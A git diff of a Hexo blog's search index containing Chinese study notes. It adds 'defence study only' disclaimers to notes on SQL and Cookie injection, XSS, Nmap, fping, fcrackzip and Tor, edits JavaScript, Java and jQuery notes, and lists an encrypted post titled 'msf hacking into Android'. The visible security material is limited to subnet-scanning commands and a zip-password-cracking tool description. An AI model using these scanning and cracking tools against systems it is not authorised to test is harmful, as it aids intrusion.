@@ -2770,6 +2770,7 @@
     <title>【笔记】Cookie 注入</title>
     <url>/2020/03/28/Cookie%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于SQL注入可能会被拦截，可以尝试采用Cookie注入的方式渗透测试</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
@@ -3846,6 +3847,7 @@
     <title>【笔记】Fcrackzip 学习笔记</title>
     <url>/2019/12/05/Fcrackzip%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>fcrackzip是一款专门破解zip类型压缩文件密码的工具，工具小巧方便、破解速度快，能使用字典和指定字符集破解，适用于Linux、MacOS系统</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="指定字符集破解-zip"><a href="#指定字符集破解-zip" class="headerlink" title="指定字符集破解.zip"></a>指定字符集破解.zip</h3><blockquote>
@@ -3946,6 +3948,7 @@
     <url>/2019/12/04/Fping%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fping类似于ping，但比ping强大。Fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。</p>
 <p>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="Ping-网段"><a href="#Ping-网段" class="headerlink" title="Ping 网段"></a>Ping 网段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -g 192.168.1.0 192.168.1.255</span><br></pre></td></tr></table></figure>
@@ -6280,12 +6283,14 @@
 
 <h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取id为d的元素</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">document</span>.getElementById(<span class="string">"d"</span>);</span><br><span class="line"><span class="comment">//2.修改元素内容</span></span><br><span class="line">d.innerHTML = <span class="string">"修改后的文字"</span>;</span><br></pre></td></tr></table></figure>
 
-<h2 id="弹窗接收字符串"><a href="#弹窗接收字符串" class="headerlink" title="弹窗接收字符串"></a>弹窗接收字符串</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = prompt();</span><br></pre></td></tr></table></figure>
+<h2 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h2><h3 id="弹窗接收字符串"><a href="#弹窗接收字符串" class="headerlink" title="弹窗接收字符串"></a>弹窗接收字符串</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = prompt();</span><br></pre></td></tr></table></figure>
 
-<h3 id="提示文字"><a href="#提示文字" class="headerlink" title="提示文字"></a>提示文字</h3><blockquote>
+<h4 id="提示文字"><a href="#提示文字" class="headerlink" title="提示文字"></a>提示文字</h4><blockquote>
 <p><code>&lt;&lt;text&gt;&gt;</code>：提示文字</p>
 </blockquote>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = prompt(&lt;&lt;text&gt;&gt;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="弹窗接收布尔值"><a href="#弹窗接收布尔值" class="headerlink" title="弹窗接收布尔值"></a>弹窗接收布尔值</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = confirm(&lt;&lt;text&gt;&gt;);</span><br></pre></td></tr></table></figure>
 
 <h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="鼠标点击时间"><a href="#鼠标点击时间" class="headerlink" title="鼠标点击时间"></a>鼠标点击时间</h3><h4 id="html"><a href="#html" class="headerlink" title="html"></a>html</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">onClick</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -6556,17 +6561,19 @@
 <blockquote>
 <p>封装一段特定的业务逻辑功能<br>方法尽可能独立，只干一件事<br>方法可以被反复调用多次<br>减少代码重复，有利于代码维护，有利于团队协作</p>
 </blockquote>
-<h4 id="方法的定义"><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰词 返回值类型 方法名(参数列表)&#123;</span><br><span class="line">    方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="方法的定义"><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰词 返回值类型 方法名(参数类型 参数名)&#123;</span><br><span class="line">    方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰词 返回值类型 方法名(参数类型... 参数名)&#123;</span><br><span class="line">    方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="方法的调用"><a href="#方法的调用" class="headerlink" title="方法的调用"></a>方法的调用</h4><ul>
 <li>无返回值：</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法名（有参传参）;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法名(有参传参);</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>有返回值：</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数据类型 变量 = 方法名（有参传参）;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数据类型 变量 = 方法名(有参传参);</span><br></pre></td></tr></table></figure>
 
 <h4 id="return"><a href="#return" class="headerlink" title="return"></a>return</h4><ul>
 <li>有返回值的方法中</li>
@@ -6584,8 +6591,7 @@
 <blockquote>
 <p>结束方法的执行</p>
 </blockquote>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>达内学习视频</p>
-]]></content>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
       <categories>
         <category>Java</category>
       </categories>
@@ -9600,6 +9606,7 @@
     <title>【笔记】Nmap 学习笔记</title>
     <url>/2019/12/04/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。（<a href="https://zh.wikipedia.org/wiki/Nmap" target="_blank" rel="noopener">维基百科</a>）</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="普通扫描"><a href="#普通扫描" class="headerlink" title="普通扫描"></a>普通扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.1</span><br></pre></td></tr></table></figure>
@@ -9805,21 +9812,6 @@
 ]]></content>
       <categories>
         <category>Raspberry Pi</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>【笔记】OWASP Broken Web Application Project 学习笔记</title>
-    <url>/2020/10/12/OWASPBrokenWebApplicationProject%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Open Web Application Security Project (OWASP) Broken Web Applications Project, a collection of vulnerable web applications that is distributed on a Virtual Machine in VMware format compatible with their no-cost and commercial VMware products.（<a href="https://sourceforge.net/projects/owaspbwa/" target="_blank" rel="noopener">软件托管网站的介绍</a>）</p>
-<a id="more"></a>
-
-<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>开放式Web应用程序安全项目（OWASP）是一个在线社区，在Web应用安全领域提供免费的文章，方法，文档，工具和技术。（<a href="https://zh.wikipedia.org/wiki/OWASP" target="_blank" rel="noopener">维基百科</a>）</p>
-<h2 id="官网地址"><a href="#官网地址" class="headerlink" title="官网地址"></a>官网地址</h2><p><a href="https://owasp.org" target="_blank" rel="noopener">官方网站</a><br><a href="http://www.owasp.org.cn/" target="_blank" rel="noopener">中国官方网站</a></p>
-<h2 id="虚拟机下载地址"><a href="#虚拟机下载地址" class="headerlink" title="虚拟机下载地址"></a>虚拟机下载地址</h2><p><a href="https://sourceforge.net/projects/owaspbwa/files/" target="_blank" rel="noopener">https://sourceforge.net/projects/owaspbwa/files/</a></p>
-<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/weixin_43583637/article/details/94627052" target="_blank" rel="noopener">CSDN——冠霖L</a></p>
-]]></content>
-      <categories>
-        <category>Penetration Tests</category>
       </categories>
   </entry>
   <entry>
@@ -11403,6 +11395,7 @@
     <title>【笔记】SQL Injection 注入攻击</title>
     <url>/2020/03/27/SQLInjection%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入攻击入门学习笔记</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h2><ul>
@@ -13251,6 +13244,7 @@
     <title>【笔记】Tor 学习笔记</title>
     <url>/2020/03/30/Tor%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tor是实现匿名通信的自由软件。其名源于“The Onion Router”（洋葱路由器）的英语缩写。用户可透过Tor接达由全球志愿者免费提供，包含7000+个中继的覆盖网络，从而达至隐藏用户真实地址、避免网络监控及流量分析的目的。Tor用户的互联网活动（包括浏览在线网站、帖子以及即时消息等通信形式）相对较难追踪。Tor的设计原意在于保障用户的个人隐私，以及不受监控地进行秘密通信的自由和能力。（<a href="https://zh.wikipedia.org/wiki/Tor" target="_blank" rel="noopener">维基百科</a>）</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">brew install tor</span><br></pre></td></tr></table></figure>
@@ -13924,6 +13918,7 @@
     <title>【笔记】XSS 跨站脚本攻击</title>
     <url>/2020/03/25/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跨站脚本攻击，是代码注入的一种，它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ol>
@@ -14208,14 +14203,20 @@
 
 <h2 id="post函数"><a href="#post函数" class="headerlink" title="post函数"></a>post函数</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.请求url</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"/jquery/doAjaxPost"</span>;</span><br><span class="line"><span class="comment">//2.请求参数</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="string">"name=zhangsan"</span>;</span><br><span class="line"><span class="comment">//3.发送异步请求</span></span><br><span class="line">$.post(url, params, (result) =&gt; &#123;</span><br><span class="line">    $(<span class="string">"#resultId"</span>).html(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
-<h2 id="ajax函数"><a href="#ajax函数" class="headerlink" title="ajax函数"></a>ajax函数</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.请求url</span></span><br><span class="line"><span class="keyword">let</span> url = <span class="string">"/jquery/doAjaxPost"</span>;</span><br><span class="line"><span class="comment">//2.请求参数</span></span><br><span class="line"><span class="keyword">let</span> params = <span class="string">"name=zhangsan"</span>;</span><br><span class="line"><span class="comment">//3.发送异步请求</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="comment">// 可以省略（默认为GET请求）</span></span><br><span class="line">    type: <span class="string">"POST"</span>,</span><br><span class="line">    url: url,</span><br><span class="line">    <span class="comment">// 可以省略</span></span><br><span class="line">    contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">    <span class="comment">// 可以省略（如果无需向服务端传递参数）</span></span><br><span class="line">    data: params,</span><br><span class="line">    <span class="comment">// 可以省略（由ajax函数内部基于返回值进行匹配处理）</span></span><br><span class="line">    <span class="comment">// 常见参数：html、xml、json、jsonp（跨域）</span></span><br><span class="line">    dataType: <span class="string">"text"</span>,</span><br><span class="line">    <span class="comment">// 可以省略（默认为true，表示异步）</span></span><br><span class="line">    <span class="keyword">async</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 处理服务端返回的正常信息</span></span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#resultId"</span>).html(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 处理服务端返回的异常信息</span></span><br><span class="line">    error: <span class="function"><span class="keyword">function</span> (<span class="params">xhr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.statusText);</span><br><span class="line">        $(<span class="string">"#resultId"</span>).html(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h2 id="ajax函数"><a href="#ajax函数" class="headerlink" title="ajax函数"></a>ajax函数</h2><blockquote>
+<p><code>type</code>：标准写法type的值应该大写</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.请求url</span></span><br><span class="line"><span class="keyword">let</span> url = <span class="string">"/jquery/doAjaxPost"</span>;</span><br><span class="line"><span class="comment">//2.请求参数</span></span><br><span class="line"><span class="keyword">let</span> params = <span class="string">"name=zhangsan"</span>;</span><br><span class="line"><span class="comment">//3.发送异步请求</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="comment">// 可以省略（默认为GET请求）</span></span><br><span class="line">    type: <span class="string">"POST"</span>,</span><br><span class="line">    url: url,</span><br><span class="line">    <span class="comment">// 可以省略</span></span><br><span class="line">    contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">    <span class="comment">// 可以省略（如果无需向服务端传递参数）</span></span><br><span class="line">    data: params,</span><br><span class="line">    <span class="comment">// 可以省略（由ajax函数内部基于返回值进行匹配处理）</span></span><br><span class="line">    <span class="comment">// 常见参数：html、xml、json、jsonp（跨域）</span></span><br><span class="line">    dataType: <span class="string">"text"</span>,</span><br><span class="line">    <span class="comment">// 可以省略（默认为true，表示异步）</span></span><br><span class="line">    <span class="keyword">async</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 处理服务端返回的正常信息</span></span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#resultId"</span>).html(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 处理服务端返回的异常信息</span></span><br><span class="line">    error: <span class="function"><span class="keyword">function</span> (<span class="params">xhr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.statusText);</span><br><span class="line">        $(<span class="string">"#resultId"</span>).html(xhr.statusText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="另一种方式"><a href="#另一种方式" class="headerlink" title="另一种方式"></a>另一种方式</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: <span class="string">"DELETE"</span>,</span><br><span class="line">    url: url</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 处理成功信息</span></span><br><span class="line">.done(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 处理失败信息</span></span><br><span class="line">.fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 无论成功或失败都执行</span></span><br><span class="line">.always(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <h2 id="load函数"><a href="#load函数" class="headerlink" title="load函数"></a>load函数</h2><ul>
 <li>load会将响应直接返回到指定位置</li>
 </ul>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.请求url</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"/jquery/doAjaxGet"</span>;</span><br><span class="line"><span class="comment">//2.请求参数</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="string">"msg=hello jquery ajax get method"</span>;</span><br><span class="line"><span class="comment">//3.发送异步请求，直接返回响应</span></span><br><span class="line">$(<span class="string">"#resultId"</span>).load(url, params);</span><br></pre></td></tr></table></figure>
 
-<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.jianshu.com/p/b36481c4f3c9" target="_blank" rel="noopener">间书——涎涎</a></p>
+]]></content>
       <categories>
         <category>HTML/CSS/JS</category>
       </categories>
@@ -14669,6 +14670,15 @@
 <li><code>attr()</code>函数在jquery1.6之前就有，对自定义属性的操作，使用<code>attr()</code>函数</li>
 <li><code>prop()</code>函数在query1.6之后新引进，对固有属性的操作，使用<code>prop()</code>函数</li>
 </ul>
+<h3 id="绑定数据"><a href="#绑定数据" class="headerlink" title="绑定数据"></a>绑定数据</h3><h4 id="新增或修改绑定的数据"><a href="#新增或修改绑定的数据" class="headerlink" title="新增或修改绑定的数据"></a>新增或修改绑定的数据</h4><blockquote>
+<p><code>&lt;key&gt;</code>：绑定的数据名<br><code>&lt;value&gt;</code>：绑定的数据值</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(...).data(&lt;key&gt;,&lt;value&gt;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看绑定的数据"><a href="#查看绑定的数据" class="headerlink" title="查看绑定的数据"></a>查看绑定的数据</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(...).data(<span class="xml"><span class="tag">&lt;<span class="name">key</span>&gt;</span>);</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="删除所有绑定的数据"><a href="#删除所有绑定的数据" class="headerlink" title="删除所有绑定的数据"></a>删除所有绑定的数据</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(...).removeData();</span><br></pre></td></tr></table></figure>
+
 <h3 id="获取集合与遍历集合"><a href="#获取集合与遍历集合" class="headerlink" title="获取集合与遍历集合"></a>获取集合与遍历集合</h3><h4 id="子节点集合"><a href="#子节点集合" class="headerlink" title="子节点集合"></a>子节点集合</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(...).children(...);</span><br><span class="line">$(...).children();</span><br></pre></td></tr></table></figure>
 
 <h4 id="后代集合"><a href="#后代集合" class="headerlink" title="后代集合"></a>后代集合</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(...).find(...);</span><br><span class="line">$(...).find();</span><br></pre></td></tr></table></figure>
@@ -14875,7 +14885,7 @@
   <entry>
     <title>【笔记】msf 黑入安卓系统</title>
     <url>/2020/01/10/msf%E9%BB%91%E5%85%A5%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F/</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="9653708adf52ab08e8cfd52c4dd7a55b49365d587e5f361937f29887394ba586">2e0bf7f568d917ba47311008e416c184470878c7e8e68706f96d0e3513baf38041bc781ccf48d9ff6eae6811df7ea6aae571f5c8fb05835e76ac41b6703573adca54c96f1862d9c9d9adbbae37481ce39475cf2137986693edddf08d9737f0eb71e2ee154524813390a603ae44b60ba7be0ae9e1dc5fe9cf7d6fd2f11fbdb9db16cd36f2ab70d49b23b3c1f8350c825a7a17b233d2b09b8f492d1775a742b651b27ff75008f297188b101c16bb42d04cb5e3b8e984511eb635f3ba4249d5121d3491f436b8a7ed00d36962889323a229d4a1e55a7718d73fe7ac22dd41eadf497e5a75197fb062bc6b3efd07446c73d46f51aa3fc49896697ab34fab0684d30473dd9b8b93da4ab222c1668996437811a53ed96f9d8525832cfeec7657e8ba5dd4173979a97e90a1c085ead8cd691714192c79b3c006ad3736edccfd342fad38d89914e2e0a950cb50fe2c2ef2ed73153b1c5867f6d8f37fdbdc5f603f272652eb67a2dd919d74c033b4bc679f44b5a5a781e367a7fbf1df8c3fc2eaabf6c6fe9276d2afc0c1f2f10a90ce44420eac0aa8a6d5514dcaaf08435c3e3408e197639b1da5af7838e444016705b27c1e81fa3129a090174872926fb9b2520f0cf03d44f8e6e898ccbbacb747f4ab2647b5d5b3ebdc02aebc3fc7eceb07e776b08095c5339aac59d5c8504c599a552751913d9be5a4048adeccda4e41e3e0731d0bf84266e941bcc326668da0c7748977e7b18e8c5bd6150a445c132592bc61f8b9184c9959148a3b222de8e60bc06f448c78d9aa8a0876eeaba5c48437d0dac10eeb22719cca8eb6b794dab0e06305b63a67a0d16a1b52d7c990da7ba1e4a78bbea277b5379439ed94e0a727df3f92aa5d8452ee987559aaf12638eceea8c8ad08a5a37a3a0550cc6210e8c0631ac4c19f26f47bb1c6f731a48b937e6a01a5ce13ecbb1cf4bd8215ee5345c9c0ce5fc99f34dc616705d2b0416a99f0942539ceca0e0c35c17d366f4e9182cd15bf2ff6f0dbe9ed7cbc00d00b710d7f0300df9ba2a70abcb237c8b048057a6cfe1778597ef8228acc787638fa6bb57d1c8c36ea0b9f7ac97b62ca9bf45b28eddfd57d1fdb67e08844d717883124143e72508635af540aac99e981db7efbccd40a85146c06c5be676fab417ac79289ae18f6ae8aca7bf6c2660576bed00afc34e665eb175e8adf8bcf02baba8898100b71ecf56cadfd8f99690280fefa466a2b3f470d8c975b3e9d0f98a84988623728a2e509ba1000cb26273a03e81924d8bf3d5d9d5c1bc7ebadc74f89ac3550e0e8e8a4763bdb46fd80fff9821ba8f78ee04b7b09cfee46bb877e24d99efbaa12c6e99d8664f60f967a7e69fb929110b9e3ae4a8f011da88c370a763105f47ff58d9890bbe5527bec9d4f9ff352e2301c24dd8dd9a78b8104ba5d40230ef86304a025bdea693200ac2bc546fc400d9fa55a0b039679760ed44d4812b4ee95f2379181914a57d444c7fd9921116e6ac47b2c6ce917661b11ad400b6a5120099b773635a29f085d77634711ed8d2d58385ce54bfd5fed25f830635b017de79be362986d6443f32f0c4ba0473a7547ceb01918c87a6dda4ab8fb070a1a226f5782ae303d3c822d18d94d7a7724b8450476725ed4a100ccaaf92a7871004510b322920337592e597dbde31ae263bc81da2a372b366674ef4eb70cc07d00f1b13f3e2b9f667f2bf3d2fa4418178942a281924ae4e17ee9ed6df3bd8b71be36ea5f3c8b4c2d29e1530e115768355472df3a07c4b2a0f0501174d002a92f88db3482c36718671987164aa26ee6eb19e8b637c8176d515829ae7575c23873472c0361db9994e0d1a2422d85107d3214f719d1e5f89949cd04cb97f7a6ff606e690937585c1e097ca20659c091b6dde36d059ee9fd839cc22a8df5f77ca3ed7514bf2898eb090a2603fda0a3a4c8677730737b318f88471eea97f277faa3ff74ca142e323b59989722f84d4218949628444639e227a128d8f8762df9bc75d096f038a90996486f4a8b4d575653f372214b8ea6f85a7cf2bb8f02cae8a0e32a19e959e9787ee4a6184d4131af738b92f1e698d1a14f62bdce486a6fae88904e851de1c808c9e9e8647b4e58744bb77c919a2f2b852a4297b5a5ea7a501519f1032433aa4f5309a3d253b8fb101087a2f1ba339a069bf35d71cb5394eae1b95db56b3ebd0c42db5046c1d0cfd49b46128c209543ff4f52f40a65439f861961066a3767ad9b85f1b20aad4a08460248c91dc2d2c9031086bb9fcb3a0184b85829df012db91764afcd5abf49a63b2ccb174eb64b2df1d98dcd6a7d872fe2bd1b885102adaf85525a599360d2b9e97dee2986d82a01b9475c92d4c4e112e2633dce92d2d0efaffd9ec277125fc0857e3bc5008a52684dc9a222c09ea57a7bc0b82dfc32792f931014f43f4ec5dce6592d336b2be21e74b0cef0cb0ddfd10031a8a541b9e3a16aa4117a95d82fdbcbd67f08ab7334b7772cb204f70c8c742dd2e00fca80596b453152cba8329400f4caed0e3fdb1306f0c85cb58043cacbbcb74acee5ff842a60a6f53488dec4fd1b3203cb8a8de41b84e6a1cb17dd0d824417bb59921f86b66821b6b9870107daf2fc92fdc31d0419368fe6c161e6e54b47417766668d8b9cccf88fb56e37e5a1824724f1b0e350d979d7e3afec4ce6773df96a61073f0f70bf5aa0498e2a9571cc61be32513fdc369e2f0401f6f84525458fada638f71b9970db00408cc64e35ffb12025ef72aead27cdfb328306d949ce5d6714de46830d3c96530dd01eb70b0310b9dc8a044e30156830090b6004a2f7ce20bf6df0118f15ac419b63668f2509e67cadeb8d52f9d5432cd9aa6955f55c2c83974f6c5890233cd2d0877d05ca0ea7b55b1b3dea050c74f41d74909bf955e9b2bdd8a4b1615156c60b83a2da73171694821b28757a32611457c4d875b72ac610388203b3af8828dbe0daa5a84220e278dd37991df14c03d0d5d555d972c9175973b8d0d11e31e4bf4585f3970f74a36d5d152a1721e1dc38cb0167e7a4a6e35783a879b90efbf217c14f6255d96273dd954f6de72ae0a036951c795fc93655a8b21bdee9b3367686bcffe1e6f96715394557bef2bc1d122d7a7f28fe147e7a78e78371421dd2dbd334d5f7f004bb110b38943a5756253e5262d87f4008f1783d83333a5ca31b83e4b73e2d3c2e1b3529e460fa0bbc8bf3841952e62a2dc1ec0011444fc4000613d2e9a76946491c7a476081efcaff5bbbc614b619b0b80e8a15b144619ecee8acf78fca97151bb81a773701616a44ca6dd66a722ee38b250f491b83ce3db69620e1f87c05762deca3c48f99088d4e1c8c24a39e4d8df101132e779f5a6f0b830f28356ebe7fc7354024962f740a934ec5e8d931f877ca4491316653e37d3159f178e00eff72fec5f6bd04493253b9efc121ed48631b3c248de0745463ce9603be7460f634ad9a907dbf709c7a9ab72aced846f7f1ddad7591322aa3505b215eb30e3d59f378dc17a03360ba5413f8ad806ac1b4b3c80007df55621edf8eb51707ce6b6a5e4739bd328861de81d61f87f66873b519954726fc33be434a4f69cb7497e7a690733d438588a26c17495878e06416d61eecf66a41a1f6942a79f7f70a4150b84a2053b897646d290ad898159d28e8231de00ed865bac09fde80192eeaa261b6cd756cb34c99f79da1dd236a8681ed8af004c77845ce5325c6ff8fbdfb84393ced6d6ce4d99277c447ff9fe